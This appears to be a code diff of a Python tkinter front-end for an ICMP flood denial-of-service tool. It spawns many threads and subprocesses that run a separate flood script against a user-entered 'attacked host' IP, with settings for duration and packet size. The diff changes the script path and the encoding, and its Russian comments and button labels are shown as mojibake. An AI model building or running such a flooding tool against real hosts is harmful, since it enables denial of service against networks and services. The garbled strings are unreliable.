@@ -1,4 +1,4 @@
-ï»¿# -*- coding: cp1251 -*-
+# -*- coding: cp1251 -*-
 import subprocess
 import threading
 import tkinter as tk
@@ -21,7 +21,7 @@ class ICMPFloodAttack:
         end_time = time.time() + duration
         while not self.stop_event.is_set() and time.time() < end_time:
             process = subprocess.Popen(
-                ['python', 'icmp_flood_args.py', '-target', ip_dest, '-duration', str(duration), '-size', str(packet_size)],
+                ['python', '_internal/icmp_flood_args.py', '-target', ip_dest, '-duration', str(duration), '-size', str(packet_size)],
                 stdout=subprocess.DEVNULL
             )
             self.process_list.append(process)
@@ -37,7 +37,7 @@ class ICMPFloodAttack:
         sent_buff_size = int(size_entry.get())
         num_threads = int(threads_entry.get())
 
-        # Ð˜Ð½Ð¸Ñ†Ð¸Ð°Ð»Ð¸Ð·Ð°Ñ†Ð¸Ñ Ð·Ð½Ð°Ñ‡ÐµÐ½Ð¸Ð¹
+        # Èíèöèàëèçàöèÿ çíà÷åíèé
         self.stop_event.clear()
         self.process_list = []
         self.threads = []
@@ -47,25 +47,25 @@ class ICMPFloodAttack:
             self.threads.append(thread)
             thread.start()
 
-        # Ð˜Ð½Ð¸Ñ†Ð¸Ð°Ð»Ð¸Ð·Ð°Ñ†Ð¸Ñ Ñ‚Ð°Ð¹Ð¼ÐµÑ€Ð°
+        # Èíèöèàëèçàöèÿ òàéìåðà
         self.timeout_timer = threading.Timer(duration, self.stop_attack)
         self.timeout_timer.start()
 
         status_label.config(text='Running...')
-        start_button.config(text='ÐžÑÑ‚Ð°Ð½Ð¾Ð²Ð¸Ñ‚ÑŒ Ð°Ñ‚Ð°ÐºÑƒ', command=self.stop_attack, state=tk.NORMAL)
+        start_button.config(text='Îñòàíîâèòü àòàêó', command=self.stop_attack, state=tk.NORMAL)
 
     def stop_attack(self):
         if self.timeout_timer and self.timeout_timer.is_alive():
-            self.timeout_timer.cancel()  # ÐžÑÑ‚Ð°Ð½Ð¾Ð²ÐºÐ° Ñ‚Ð°Ð¹Ð¼ÐµÑ€Ð°
+            self.timeout_timer.cancel()  # Îñòàíîâêà òàéìåðà
         self.stop_event.set()
         for process in self.process_list:
             try:
                 process.terminate()
             except ProcessLookupError:
-                # ÐžÐ±Ñ€Ð°Ð±Ð¾Ñ‚ÐºÐ° Ð¸ÑÐºÐ»ÑŽÑ‡ÐµÐ½Ð¸Ð¹
+                # Îáðàáîòêà èñêëþ÷åíèé
                 pass
         status_label.config(text='Attack stopped.')
-        start_button.config(text='Ð—Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ Ð°Ñ‚Ð°ÐºÑƒ', command=self.start_attack, state=tk.NORMAL)
+        start_button.config(text='Çàïóñòèòü àòàêó', command=self.start_attack, state=tk.NORMAL)
 
     def main(self):
         global ip_entry, duration_entry, size_entry, threads_entry, status_label, start_button
@@ -76,23 +76,23 @@ class ICMPFloodAttack:
         frame = ttk.Frame(root, padding="10")
         frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
 
-        ttk.Label(frame, text="IP-Ð°Ð´Ñ€ÐµÑ Ð°Ñ‚Ð°ÐºÑƒÐµÐ¼Ð¾Ð³Ð¾ Ñ…Ð¾ÑÑ‚Ð°:").grid(column=0, row=0, sticky=tk.W)
+        ttk.Label(frame, text="IP-àäðåñ àòàêóåìîãî õîñòà:").grid(column=0, row=0, sticky=tk.W)
         ip_entry = ttk.Entry(frame, width=15)
         ip_entry.grid(column=1, row=0, sticky=tk.W)
 
-        ttk.Label(frame, text="ÐŸÑ€Ð¾Ð´Ð¾Ð»Ð¶Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ð¾ÑÑ‚ÑŒ Ð°Ñ‚Ð°ÐºÐ¸ (Ñ):").grid(column=0, row=1, sticky=tk.W)
+        ttk.Label(frame, text="Ïðîäîëæèòåëüíîñòü àòàêè (ñ):").grid(column=0, row=1, sticky=tk.W)
         duration_entry = ttk.Entry(frame, width=15)
         duration_entry.grid(column=1, row=1, sticky=tk.W)
 
-        ttk.Label(frame, text="Ð Ð°Ð·Ð¼ÐµÑ€ Ð¿Ð°ÐºÐµÑ‚Ð° (Ð±Ð°Ð¹Ñ‚):").grid(column=0, row=2, sticky=tk.W)
+        ttk.Label(frame, text="Ðàçìåð ïàêåòà (áàéò):").grid(column=0, row=2, sticky=tk.W)
         size_entry = ttk.Entry(frame, width=15)
         size_entry.grid(column=1, row=2, sticky=tk.W)
 
-        ttk.Label(frame, text="ÐšÐ¾Ð»Ð¸Ñ‡ÐµÑÑ‚Ð²Ð¾ Ð¿Ð¾Ñ‚Ð¾ÐºÐ¾Ð²:").grid(column=0, row=3, sticky=tk.W)
+        ttk.Label(frame, text="Êîëè÷åñòâî ïîòîêîâ:").grid(column=0, row=3, sticky=tk.W)
         threads_entry = ttk.Entry(frame, width=15)
         threads_entry.grid(column=1, row=3, sticky=tk.W)
 
-        start_button = ttk.Button(frame, text='Ð—Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ Ð°Ñ‚Ð°ÐºÑƒ', command=self.start_attack)
+        start_button = ttk.Button(frame, text='Çàïóñòèòü àòàêó', command=self.start_attack)
         start_button.grid(column=0, row=4, columnspan=2, pady=10)
 
         status_label = ttk.Label(frame, text='')
